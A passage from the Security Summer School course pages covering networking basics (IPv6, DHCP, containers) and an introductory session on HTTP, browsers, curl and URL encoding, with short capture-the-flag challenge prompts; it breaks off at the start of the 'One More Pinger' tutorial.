&lt;p>There is also a very well-known attack, called &lt;strong>Distributed Denial of Service (DDoS)&lt;/strong>, by which an attacker floods a server with &lt;code>ping&lt;/code>s essentially.
The purpose of this attack is to overwhelm the server by making it do nothing else but respond to these &lt;code>pings&lt;/code>, rather than serve the actual requests for which it was designed.
Thus, this type of attack aims to render a server useless, or even make it crash.
The attack has been executed in many forms, with one of the simplest being described &lt;a href="https://www.cloudflare.com/learning/ddos/glossary/internet-control-message-protocol-icmp/">here&lt;/a>.&lt;/p>
&lt;h3 id="url-vs-uri">URL vs URI&lt;/h3>
&lt;p>This session you&amp;rsquo;ve learned about &lt;em>URL&lt;/em>s, but you might have also heard about &lt;em>URI&lt;/em>s.
They&amp;rsquo;re quite similar, but still different.
&lt;a href="https://danielmiessler.com/study/difference-between-uri-url/">Here&lt;/a>&amp;rsquo;s the difference explained.&lt;/p>
&lt;h3 id="ipv6">IPv6&lt;/h3>
&lt;p>Since regular IPs (also known as &lt;strong>IPv4&lt;/strong>) are 32-bit numbers, there are &lt;code>2^32&lt;/code> possible unique IPs.
This number may look large, but it&amp;rsquo;s &lt;em>just&lt;/em> 4,294,967,296, so just upwards of 4 billion.
But the world&amp;rsquo;s population is 7.9 billion as of September 2021, and growing.
The pigeonhole principle tells us there are not enough IPs so that every human can be connected to the Internet at the same time.&lt;/p>
&lt;p>For this reason and some others related to the lack of native security of the IP protocol, a new iteration of IPs was designed: &lt;strong>IPv6&lt;/strong>.
These new IPs are 128-bit numbers.
&lt;code>2^128&lt;/code> is 39 &lt;strong>digits&lt;/strong> long, so it should suffice for the entirety of Earth&amp;rsquo;s population (a few times over).&lt;/p>
&lt;p>For a better (but still short) introduction to IPv6, check out &lt;a href="http://www.steves-internet-guide.com/ipv6-guide/">this&lt;/a> source.&lt;/p>
&lt;h3 id="dhcp">DHCP&lt;/h3>
&lt;p>&lt;strong>Dynamic Host Configuration Protocol (DHCP)&lt;/strong> is a protocol used in order to manage and distribute IP addresses.
Hosts are &lt;em>leased&lt;/em> IP addresses from DHCP servers for a limited amount of time.
When an address is about to expire, a host can ask the server to extend the lease.
You can read more about DHCP servers &lt;a href="https://www.infoblox.com/glossary/dhcp-server/">here&lt;/a>.&lt;/p>
&lt;h3 id="containers">Containers&lt;/h3>
&lt;p>The main difference between containers and VMs is that VMs use their own separate OS, whereas containers share the OS with the host.
Think about your Kali Linux VM.
It obviously has a separate OS: Kali Linux, duh, while you have your own OS: Windows, Linux, MacOS, whatever.
The operating system inside the VM is called &lt;strong>guest OS&lt;/strong>, while the &amp;ldquo;outer&amp;rdquo; OS is called &lt;strong>host OS&lt;/strong>.
When it comes to VMs, you need some sort of &lt;em>mediator&lt;/em> between the guest and the host.
This mediator is called &lt;strong>a hypervisor&lt;/strong>.
In your case, this is VirtualBox.&lt;/p>
&lt;p>This separation between OSs ensures a more secure separation between the two environments.
On the other hand, if a host spawns multiple containers, all of them (host and containers) use the host&amp;rsquo;s OS.
The containers are most importantly separated at the filesystem level.
They can also be allocated more limited resources.
Notice that if you were to use a container for the Security Summer School, you couldn&amp;rsquo;t use Kali Linux unless your host OS were also Kali Linux, which would have been pretty pointless.&lt;/p>
&lt;p>&lt;img src="./assets/containers-vs-virtual-machines.png" alt="Containers vs VMs">&lt;/p>
&lt;p>However, we use containers to host challenges because our VMs and containers all use Linux and because we can house more containers on the same host (which is itself a VM) than we could VMs.
You can learn more about containers and how to manage them using &lt;code>docker&lt;/code> (we also use it for challenges) &lt;a href="https://www.docker.com/resources/what-container/">here&lt;/a>.&lt;/p></description></item><item><title>Essentials:</title><link>/essentials/rediscovering-the-browser/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/rediscovering-the-browser/</guid><description>
&lt;h1 id="rediscovering-the-browser">(Re)Discovering the Browser&lt;/h1>
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>In this session we&amp;rsquo;ll zoom in on one of the application-level protocols mentioned in session &lt;a href="../explaining-the-internet/">Explaining the Internet&lt;/a>: HTTP.
We&amp;rsquo;ll explain how the browser works and what information to draw from the most widely spoken language on the Internet: HTML.
In addition, we&amp;rsquo;ll also imitate the behaviour of our browser using two highly-versatile commands: &lt;code>curl&lt;/code> and &lt;code>wget&lt;/code>.&lt;/p>
&lt;h2 id="reminders-and-prerequisites">Reminders and Prerequisites&lt;/h2>
&lt;p>For this session, you&amp;rsquo;ll need:&lt;/p>
&lt;ul>
&lt;li>a high-level understanding of the TCP/IP stack explained in session &lt;a href="../explaining-the-internet/">Explaining the Internet&lt;/a>&lt;/li>
&lt;li>an internet connection&lt;/li>
&lt;li>a Firefox/Chrome browser&lt;/li>
&lt;li>a Linux CLI&lt;/li>
&lt;/ul>
&lt;h2 id="web-applications">Web Applications&lt;/h2>
&lt;p>A typical web application is essentially a server.
A server is a host connected to the Internet that &lt;strong>listens&lt;/strong> for connections from &lt;strong>clients&lt;/strong>.
A client is any application that interacts with the server.
So in short, the server waits for clients to come to it.
The clients are proactive.
They reach out to the server by initiating connections.&lt;/p>
&lt;p>&lt;img src="./assets/client-server.svg" alt="Web Application Model">&lt;/p>
&lt;h2 id="web-security">Web Security&lt;/h2>
&lt;p>There are 3 main subjects when it comes to web security:&lt;/p>
&lt;ul>
&lt;li>client-side security (i.e. browser security)&lt;/li>
&lt;li>server-side security&lt;/li>
&lt;li>communications security (i.e. the security of the data while it&amp;rsquo;s travelling from client to server or vice-versa)&lt;/li>
&lt;/ul>
&lt;p>In this track, we&amp;rsquo;ll discuss about server-side security as attacking servers is by far the most rewarding out of the 3 options above.
Since servers communicate with lots of clients, infecting one server can allow an attacker to steal data or even infect the server&amp;rsquo;s clients as well.&lt;/p>
&lt;h3 id="aaa">AAA&lt;/h3>
&lt;p>We say there are 3 A&amp;rsquo;s when it comes to web security (and not only web security):&lt;/p>
&lt;ul>
&lt;li>Authentication&lt;/li>
&lt;li>Authorisation&lt;/li>
&lt;li>Accounting&lt;/li>
&lt;/ul>
&lt;h4 id="authentication">Authentication&lt;/h4>
&lt;p>Authorisation refers to verifying the client&amp;rsquo;s identity.
It&amp;rsquo;s usually done via requiring the client to submit some credentials such as username and password.
Simply put, authentication takes place whenever you are required to &lt;strong>login&lt;/strong> to a website.
The purpose of authentication is obvious: to prevent attackers from &lt;strong>impersonating&lt;/strong> legitimate users.&lt;/p>
&lt;p>So authentication means answering the question: &amp;ldquo;Who are you?&amp;rdquo;
Authentication on its own is not &lt;em>that&lt;/em> powerful.
It might allow the server admin to specify which users are allowed to login to a system, but not &lt;em>what they can do&lt;/em> once they&amp;rsquo;re logged on that system.&lt;/p>
&lt;h4 id="authorisation">Authorisation&lt;/h4>
&lt;p>In order to have a finer access control, such as specifying that a given user may read some files from the server while others can&amp;rsquo;t, authentication is not enough.
We need a means to &lt;strong>enforce&lt;/strong> some security policies like, for example, UNIX-like permissions on the file system.
Authentication helps us identify the user, but we need another &amp;ldquo;A&amp;rdquo;, called &lt;strong>Authorisation&lt;/strong> in order to decide what that user may or may not do.&lt;/p>
&lt;p>In short, authorisation answers the question: &amp;ldquo;What can you do?&amp;rdquo;.
It means defining a set of &lt;strong>policies&lt;/strong> by which to grant users various kinds of access to different resources.
You can read about the 3 large types of access control types, from which policies derive, &lt;a href="#access-control-types">at the end of this session&lt;/a>.&lt;/p>
&lt;h4 id="accounting">Accounting&lt;/h4>
&lt;p>Accounting refers to logging as a means to audit a system.
Logs provide a chronological view of the events that took place on a system / web server.
Using them we can trace and understand attackers better and protect from them in the future.&lt;/p>
&lt;h2 id="hypertext-transfer-protocol-http">HyperText Transfer Protocol (HTTP)&lt;/h2>
&lt;p>As its name implies, HTTP was initially used to transfer text-based data, because when it was proposed in 1991, that&amp;rsquo;s what its creators imagined the Internet was going to be: a collection of text files.
Later versions of HTTP started to accommodate more types of data, including video, audio and even raw bytes.
Nowadays, you can send anything via HTTP.
Still, one of the main things that browsers receive via HTTP is &lt;strong>HTML (HyperText Markup Language)&lt;/strong>.
We&amp;rsquo;ll dive into HTML &lt;a href="#html">a bit later in this session&lt;/a>.&lt;/p>
&lt;p>Notice that both HTTP and HTML contain the word &amp;ldquo;HyperText&amp;rdquo;.
It refers to a property of websites to contain &lt;strong>references&lt;/strong> to other websites or to other parts of the same website, thus creating a &lt;em>web-like structure of the Intenet&lt;/em>, thus the &lt;em>World-Wide Web&lt;/em>.
Markdown is another hypertext language.
We use Markdown to write text content for the Security Summer School.
We can use references to &lt;a href="#further-reading">other sections of the same document&lt;/a>, or to &lt;a href="https://www.youtube.com/watch?v=jIQ6UV2onyI">other websites&lt;/a> entirely.&lt;/p>
&lt;p>As you may remember from &lt;a href="../explaining-the-internet/">the previous session&lt;/a>, HTTP is an application-layer protocol.
This means it sits at the top of the TCP/IP stack and mostly receives and sends user data from and to its underlying transport protocol.
As the transferred data is mostly text, error checking is important.
Thus, the transport-layer protocol used by HTTP is TCP.&lt;/p>
&lt;p>Most websites nowadays use HTTP or HTTPS to transfer data.
Remember the anatomy of a URL, also from &lt;a href="../explaining-the-internet#anatomy-of-a-url">the previous session&lt;/a>.&lt;/p>
&lt;p>&lt;img src="../explaining-the-internet/assets/url_anatomy.png" alt="Anatomy of a URL">&lt;/p>
&lt;p>The first part of a URL is called the &lt;strong>scheme&lt;/strong>.
It defines the protocol used for interacting with that website.
In the example above, the scheme is &lt;code>http&lt;/code>, i.e. messages to and from the website &lt;code>www.example.com&lt;/code> will be passed using HTTP.
By default, HTTP uses port 80 to listen for connections, but we can use any other port we want.
Usually, these ports are in the 8000 - 8099 range to maintain some visual consistency with the original port.&lt;/p>
&lt;p>The &lt;code>http&lt;/code> scheme isn&amp;rsquo;t so common now.
Most websites you visit on a daily basis use a different scheme: &lt;code>https&lt;/code>.
&lt;code>security-summer-school.github.io&lt;/code>, for example, uses HTTPS.&lt;/p>
&lt;h3 id="https">HTTPS&lt;/h3>
&lt;p>HTTPS stands for HTTP &lt;strong>Secure&lt;/strong>.
As we&amp;rsquo;re going to see in the &lt;a href="#http-requests-and-responses">next section&lt;/a>, HTTP sends data in clear text.
This means that any attacker can intercept network traffic and see what data is being transferred.
HTTPS was developed to remedy this vulnerability.
Instead of being built on top of TCP, HTTPS is built on top of &lt;em>yet another application-level-protocol&lt;/em>: &lt;strong>Transport Layer Security (TLS)&lt;/strong>.
TLS allows data sent via HTTPS to be encrypted, thus making it unintelligible for attackers.&lt;/p>
&lt;h2 id="requests-and-responses">Requests and Responses&lt;/h2>
&lt;p>HTTP has 4 properties that have allowed it to become ubiquitous in the Internet:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>Statelessness:&lt;/strong> by default HTTP is a simple request-response protocol maintaining no state between successive communications.
Its design specifies that &lt;strong>every&lt;/strong> request is independent from any other.
This is good for designing a web server as it makes it simpler and cleaner, but what if that server is Facebook?
Once you log in, you want it to &amp;ldquo;remember&amp;rdquo; who you are so you can still be logged in after more than 1 click.
A stateless protocol cannot do this.
This shortcoming has led to the design of cookies, which are small pieces of information exchanged between the client and the web application.
They are used to &amp;ldquo;remind&amp;rdquo; the server who the client is upon each request.
We&amp;rsquo;ll discuss cookies in &lt;a href="../hacking-the-web/#cookies">the next session&lt;/a>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Message format:&lt;/strong> HTTP requests have a specific format.
Namely, they are comprised of plain-text header and data (although newer improvements also implement a binary protocol).
The header contains various information about the client or the server (e.g. a user-agent, page caching information, text encoding information), while the payload is very often (but not always) an HTML page.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Addressing:&lt;/strong> resources on the web are located using the URL addressing scheme.
Possible vulnerabilities here include a misconfigured web server that allows viewing application-specific files, or worse, that allows accessing other files on the host machine.
While this information leakage is not very dangerous by itself, it may be used as an intermediary stage for other attacks.
You can read more about URLs &lt;a href="https://skorks.com/2010/05/what-every-developer-should-know-about-urls/">here&lt;/a>.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Request methods:&lt;/strong> HTTP communication is done by using methods, also called HTTP verbs.
The most used methods are &lt;code>GET&lt;/code>, &lt;code>POST&lt;/code>, &lt;code>PUT&lt;/code> and &lt;code>DELETE&lt;/code>.&lt;/p>
&lt;ul>
&lt;li>The &lt;code>GET&lt;/code> method is read-only and is used to retrieve data from the server.&lt;/li>
&lt;li>A &lt;code>DELETE&lt;/code> request is used to remove the specified resource from the server.&lt;/li>
&lt;li>The &lt;code>PUT&lt;/code> method is used to modify an entire resource.&lt;/li>
&lt;li>&lt;code>POST&lt;/code> requests are used to create new resources.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;p>You can find more information about all existing methods &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">here&lt;/a>.&lt;/p>
&lt;p>Communication between a client and a server usually follows these steps:&lt;/p>
&lt;ol>
&lt;li>A client (a browser) sends an HTTP request to the web.&lt;/li>
&lt;li>A web server receives the request.&lt;/li>
&lt;li>The server runs an application to process the request.&lt;/li>
&lt;li>The server returns an HTTP response (output) to the browser.&lt;/li>
&lt;li>The client (the browser) receives the response.&lt;/li>
&lt;/ol>
&lt;h3 id="requests">Requests&lt;/h3>
&lt;p>&lt;img src="./assets/http-request.png" alt="HTTP - Request">&lt;/p>
&lt;p>Here we have a &lt;code>GET&lt;/code> request.
It is made for a file: &lt;code>/index.html&lt;/code>.&lt;/p>
&lt;p>Remember the &lt;strong>path&lt;/strong> from the anatomy of a URL:&lt;/p>
&lt;p>&lt;img src="../explaining-the-internet/assets/url_anatomy.png" alt="Anatomy of a URL Again">&lt;/p>
&lt;p>This is the file that you request.
The path is like a path in the Linux file system.
In the image above, the request asks for the file &lt;code>/path/to/myfile.html&lt;/code>.
So the request would look something like:&lt;/p>
&lt;pre tabindex="0">&lt;code>GET /path/to/myfile.html HTTP/1.1
[...]
&lt;/code>&lt;/pre>&lt;p>Below the first line in the picture that precedes the anatomy of a URL, we can find the &lt;strong>headers&lt;/strong> of the request.
They are metadata used to provide additional information about the connection, about the client and about how to handle the request.
Some usual headers are:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Host:&lt;/strong> indicates the desired host handling the request&lt;/li>
&lt;li>&lt;strong>Accept:&lt;/strong> indicates what MIME type(s) are accepted by the client; often used to specify JSON or XML output for web-services&lt;/li>
&lt;li>&lt;strong>Cookie:&lt;/strong> passes cookie data to the server&lt;/li>
&lt;li>&lt;strong>Referrer:&lt;/strong> page leading to this request (note: this is not passed to other servers when using HTTPS on the origin)&lt;/li>
&lt;li>&lt;strong>Authorization:&lt;/strong> used for basic auth pages (mainly).
It takes the form &amp;ldquo;Basic &amp;lt;username:password encoded with base64 &amp;gt;&amp;rdquo;
Don&amp;rsquo;t worry about what &lt;code>base64&lt;/code> is now.
We&amp;rsquo;ll explain it in the &lt;a href="../data-representation/">Data Representation&lt;/a> session.&lt;/li>
&lt;li>&lt;strong>Content-Type:&lt;/strong> specifies the format of the data
Some examples are:
&lt;ul>
&lt;li>&lt;code>text/html&lt;/code> for a HTML page&lt;/li>
&lt;li>&lt;code>text/plain&lt;/code> for plain text&lt;/li>
&lt;li>&lt;code>application/json&lt;/code> for JSON files&lt;/li>
&lt;li>&lt;code>image/jpeg&lt;/code> for JPEG images&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Content-Length:&lt;/strong> specifies the size in bytes of the &lt;strong>body&lt;/strong>.
The body is the data that comes along with a request or response.
It is described in some more detail in &lt;a href="#request-body">its own section&lt;/a>.&lt;/li>
&lt;/ul>
&lt;h3 id="responses">Responses&lt;/h3>
&lt;p>&lt;img src="./assets/http-response.png" alt="HTTP - Response">&lt;/p>
&lt;ul>
&lt;li>&lt;code>1xx&lt;/code>: informational responses&lt;/li>
&lt;li>&lt;code>2xx&lt;/code>: the request was fulfilled successfully.
The most common code is &lt;code>200&lt;/code>.&lt;/li>
&lt;li>&lt;code>3xx&lt;/code>: redirects - the request was passed to another server&lt;/li>
&lt;li>&lt;code>4xx&lt;/code>: client errors.
Some very common client errors are:
&lt;ul>
&lt;li>&lt;code>400&lt;/code>: &lt;strong>bad request&lt;/strong> - there&amp;rsquo;s an error in the request.&lt;/li>
&lt;li>&lt;code>404&lt;/code>: &lt;strong>not found&lt;/strong> - the requested resource doesn&amp;rsquo;t exist.
For example, in case &lt;code>/file.txt&lt;/code> doesn&amp;rsquo;t exist and the client sends &lt;code>GET /file.txt HTTP/1.1&lt;/code>, the server answers with &lt;code>404&lt;/code>.&lt;/li>
&lt;li>&lt;code>403&lt;/code>: &lt;strong>unauthorised&lt;/strong> - you don&amp;rsquo;t have access to that resource.
Let&amp;rsquo;s say the file &lt;code>secret.txt&lt;/code> exists, but is only accessible to the &lt;code>admin&lt;/code> user.
If a regular user sends &lt;code>GET /secret.txt HTTP/1.1&lt;/code>, they would get a &lt;code>403&lt;/code> response in return.&lt;/li>
&lt;li>&lt;code>405&lt;/code>: &lt;strong>method not allowed&lt;/strong> - say a server only allows &lt;code>GET&lt;/code> and &lt;code>POST&lt;/code> methods.
You would get a &lt;code>405&lt;/code> response if you sent it a &lt;code>PUT&lt;/code> method, for example.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>5xx&lt;/code>: server errors&lt;/li>
&lt;/ul>
&lt;h4 id="challenge---cockroach">Challenge - Cockroach&lt;/h4>
&lt;p>What methods does the server support?&lt;/p>
&lt;h3 id="query-parameters">Query Parameters&lt;/h3>
&lt;p>This is the last time today that you&amp;rsquo;ll se the image with the anatomy of a URL, we promise.&lt;/p>
&lt;p>&lt;img src="../explaining-the-internet/assets/url_anatomy.png" alt="Anatomy of a URL Yet Again">&lt;/p>
&lt;p>Look at the &lt;strong>parameters&lt;/strong> of the URL
They are highlighted in blue.
Query parameters are key-value pairs that the server can retrieve from the request.
So in our example, the server can see that &lt;code>key1&lt;/code> has the value &lt;code>value1&lt;/code> and &lt;code>value2&lt;/code> corresponds to &lt;code>key2&lt;/code>.&lt;/p>
&lt;p>Think of HTTP queries/requests (&lt;code>GET&lt;/code>, &lt;code>POST&lt;/code>, &lt;code>PUT&lt;/code> etc.) as &lt;strong>functions&lt;/strong>.
They return something (the codes explained in the earlier section and sometimes data, like in the case of &lt;code>GET&lt;/code>) and might have side effects (&lt;code>POST&lt;/code>, &lt;code>PUT&lt;/code>, &lt;code>DELETE&lt;/code> come to mind here).
Each pair of &lt;strong>path and method&lt;/strong> is equivalent to a function.
In any programming language, functions also take arguments.
These arguments are the query parameters of a request.
And just like function arguments, they provide input to the server, values by which the client can alter its behaviour.&lt;/p>
&lt;h4 id="challenge-give-to-get">Challenge: Give to Get&lt;/h4>
&lt;p>Find the correct query parameter with which to get the flag.
The message displayed by the server contains all the hints you need.&lt;/p>
&lt;h3 id="request-body">Request Body&lt;/h3>
&lt;p>Obviously, HTTP requests may also contain raw data.
For example, if we use a &lt;code>POST&lt;/code> method, we also have to provide the data to be saved on the server.
Notice that the field &lt;code>Content-Length&lt;/code> from the header of the request must contain the length of the &lt;strong>body&lt;/strong>.
Otherwise, the server may discard any bytes that exceed the specified &lt;code>Content-Length&lt;/code>.&lt;/p>
&lt;h2 id="browsers">Browsers&lt;/h2>
&lt;p>Browsers are the most common type of client for web servers.
They send requests to servers like the ones we outlined &lt;a href="#requests">before&lt;/a>.
Servers respond with text files, images, audio files, all kinds of data.
Browsers also store those precious cookies that all websites are eager to give you.
We&amp;rsquo;ll dive deeper into browsers &lt;a href="../hacking-the-web/">next session&lt;/a>.&lt;/p>
&lt;p>For now, press &lt;code>Ctrl + u&lt;/code> in your browser.
It should lead you to a more weird-looking &lt;a href="view-source:https://security-summer-school.github.io/essentials/rediscovering-the-browser/">version of our website&lt;/a>.
This is the HTML code that the browser &lt;strong>renders&lt;/strong> in order to display its contents in a more &amp;ldquo;eye-candy&amp;rdquo; fashion (insert images, code snippets, videos etc.).&lt;/p>
&lt;h3 id="html">HTML&lt;/h3>
&lt;p>As we&amp;rsquo;ve &lt;a href="#hypertext-transfer-protocol-http">already established&lt;/a>, HTML stands for HyperText Markup Language.
It&amp;rsquo;s a &lt;strong>description language&lt;/strong>, in which the text content of a website is stored.
If you look at view-source:https://security-summer-school.github.io/essentials/rediscovering-the-browser/, you&amp;rsquo;ll find that the sentences in the &lt;code>.html&lt;/code> file are the same ase those on &lt;a href="https://github.com/security-summer-school/essentials/blob/master/rediscovering-the-browser/index.md">GitHub&lt;/a>.
&lt;code>security-summer-school.github.io&lt;/code> is built using &lt;a href="https://github.com/google/docsy-example">Docsy&lt;/a>.
Among many other things, Docsy can convert Markdown files to HTML.
This is how we write these sessions in Markdown (another markup language), but you see them in HTML.&lt;/p>
&lt;h4 id="challenge-eyes">Challenge: Eyes&lt;/h4>
&lt;p>Investigate the HTML code of the website and get the flag.&lt;/p>
&lt;h4 id="the-document-object-model-dom">The Document Object Model (DOM)&lt;/h4>
&lt;p>Every HTML file is organised hierarchically by what&amp;rsquo;s called a &lt;strong>Document Object Model (DOM)&lt;/strong>.
It connects web pages to scripts or programming languages by representing the structure of a document, such as the HTML representing a web page, in memory.&lt;/p>
&lt;p>The DOM represents a document as a tree data structure.
Each branch of the tree ends in a node, and each node contains objects.
DOM methods allow programmatic access to the tree.
With them, you can change the document&amp;rsquo;s structure, style, or content.&lt;/p>
&lt;p>&lt;img src="./assets/dom.png" alt="DOM">&lt;/p>
&lt;p>Every element within your document is an object: &lt;code>\&amp;lt;head\&amp;gt;&lt;/code> or &lt;code>\&amp;lt;body\&amp;gt;&lt;/code> tags etc.
DOMs are flexible and allow easy introduction of nodes, as all objects are nodes.
The DOM can also be used to make changes to the contents of the HTML document, such as creating animations or validating input etc.&lt;/p>
&lt;p>DOM&amp;rsquo;s are outside the scope of the Security Essentials track.
To get a better understanding of DOM&amp;rsquo;s, join the &lt;a href="https://security-summer-school.github.io/web">Web Security track&lt;/a> next year.&lt;/p>
&lt;h2 id="browsers-from-the-cli">&amp;ldquo;Browsers&amp;rdquo; From the CLI&lt;/h2>
&lt;p>The browser is all nice and good-looking, but is not so easily configurable.
It&amp;rsquo;s a bit difficult to add your own headers to a request form a browser, for example.
And good luck writing a script that launches subsequent, interdependent browser requests.
When it comes to hacking and crafting very specific HTTP requests, we need to move away from the browser and into the CLI.&lt;/p>
&lt;h3 id="curl">&lt;code>curl&lt;/code>&lt;/h3>
&lt;p>The most versatile CLI tool for creating and sending HTTP requests is by far &lt;code>curl&lt;/code>.
It&amp;rsquo;s syntax is at firs really simple:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# curl &amp;lt;URL&amp;gt;
&lt;/code>&lt;/pre>&lt;p>To see the full request and response, use the &lt;code>-v&lt;/code> parameter:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# curl -v example.com
* Trying 93.184.216.34:80...
* TCP_NODELAY set
* Connected to example.com (93.184.216.34) port 80 (#0)
&amp;gt; GET / HTTP/1.1
&amp;gt; Host: example.com
&amp;gt; User-Agent: curl/7.68.0
&amp;gt; Accept: */*
&amp;gt;
* Mark bundle as not supporting multiuse
&amp;lt; HTTP/1.1 200 OK
&amp;lt; Age: 441067
&amp;lt; Cache-Control: max-age=604800
&amp;lt; Content-Type: text/html; charset=UTF-8
&amp;lt; Date: Sat, 02 Jul 2022 18:33:49 GMT
&amp;lt; Etag: &amp;#34;3147526947+ident&amp;#34;
&amp;lt; Expires: Sat, 09 Jul 2022 18:33:49 GMT
&amp;lt; Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT
&amp;lt; Server: ECS (dcb/7EEA)
&amp;lt; Vary: Accept-Encoding
&amp;lt; X-Cache: HIT
&amp;lt; Content-Length: 1256
&amp;lt;
&amp;lt;!doctype html&amp;gt;
[...]
&lt;/code>&lt;/pre>&lt;p>The request is very simple:&lt;/p>
&lt;pre tabindex="0">&lt;code>GET / HTTP/1.1
Host: example.com
User-Agent: curl/7.68.0
Accept: */*
&lt;/code>&lt;/pre>&lt;p>It requests the root of the website, that the client (&lt;code>User-Agent&lt;/code>) is &lt;code>curl&lt;/code> version &lt;code>7.68.0&lt;/code>, and that it accepts any type of response (&lt;code>Accept&lt;/code>).&lt;/p>
&lt;p>The server at &lt;code>example.com&lt;/code> answers with the code 200, meaning the request was handled smoothly.
It specifies that the delivered content is an HTML file (&lt;code>Content-Type: text/html&lt;/code>), with UTF-8 encoding (&lt;code>charset=UTF-8&lt;/code>).
If you don&amp;rsquo;t know what UTF-8 is yet, it&amp;rsquo;s a convention on how to encode characters.
We will explain it along with other encodings in session &lt;a href="../data-representation/">Data Representation&lt;/a>.
Notice that since the response does contain a body (i. e. the HTML contents of example.com), the &lt;code>Content-Length&lt;/code> field is also present and set to the size of the HTML file.&lt;/p>
&lt;p>&lt;code>curl&lt;/code>&amp;rsquo;s versatility comes from the fact that we can enrich this request by specifying &lt;a href="#query-parameters">query parameters&lt;/a> and even a &lt;a href="#request-body">body&lt;/a>.&lt;/p>
&lt;h3 id="url-encodings">URL encodings&lt;/h3>
&lt;p>Head over to your browser and search for &lt;code>security; summer ? school&lt;/code>.
Take a look at the link in the browser:&lt;/p>
&lt;pre tabindex="0">&lt;code>https://www.google.com/search?client=firefox-b-lm&amp;amp;q=security%3B+summer+%3F+school
&lt;/code>&lt;/pre>&lt;p>To recap, its query parameters are:&lt;/p>
&lt;ul>
&lt;li>&lt;code>client=firefox-b-lm&lt;/code>&lt;/li>
&lt;li>&lt;code>q=security%3B+summer+%3F+school&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>The first parameter seems reasonable.
But what&amp;rsquo;s with the weird symbols in the value of &lt;code>q&lt;/code>?
Those symbols are the &lt;strong>URL encodings&lt;/strong> of &lt;code>; &lt;/code> and &lt;code>?&lt;/code>.
In order for the value of &lt;code>q&lt;/code> not to contain some specific characters used by URLs (such as &lt;code>?&lt;/code> to separate the path from the query parameters), those characters are &lt;strong>encoded&lt;/strong> differently in the URL.
It&amp;rsquo;s something similar to escaping characters in bash.&lt;/p>
&lt;p>Specifically, in the URL below:&lt;/p>
&lt;ul>
&lt;li>&lt;code>+&lt;/code> is the URL encoding for space&lt;/li>
&lt;li>&lt;code>%3B&lt;/code> is the URL encoding for &lt;code>;&lt;/code>&lt;/li>
&lt;li>&lt;code>%3F&lt;/code> is the URL encoding for &lt;code>?&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="tutorial---readme">Tutorial - Readme&lt;/h3>
&lt;p>The website tells you to click a hyperlink.
Do it and then look at the address bar.
Notice the query parameter &lt;code>flag=&amp;lt;flag value&amp;gt;&lt;/code>.
Flags can be hidden anywhere.&lt;/p>
&lt;h3 id="tutorial---one-more-pinger">Tutorial - One More Pinger&lt;/h3>
&lt;p>That was simple.
Now it&amp;rsquo;s time for a more difficult use case of query parameters.
Yes, it&amp;rsquo;s &amp;ldquo;Pinger&amp;rdquo; again.
But this time, you&amp;rsquo;ll solve it &lt;strong>entirely from the terminal&lt;/strong>.&lt;/p>
&lt;p>First, get the HTML content of the website:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>root@kali:~# curl http://141.85.224.70:8069/pinger
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">html&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">head&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">title&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>Pinger&lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">title&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">head&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">h2&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>My purpose is simple: I check the availability of network hosts by pinging their IP. Use the text box below to give me an IP to ping.&lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">h2&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
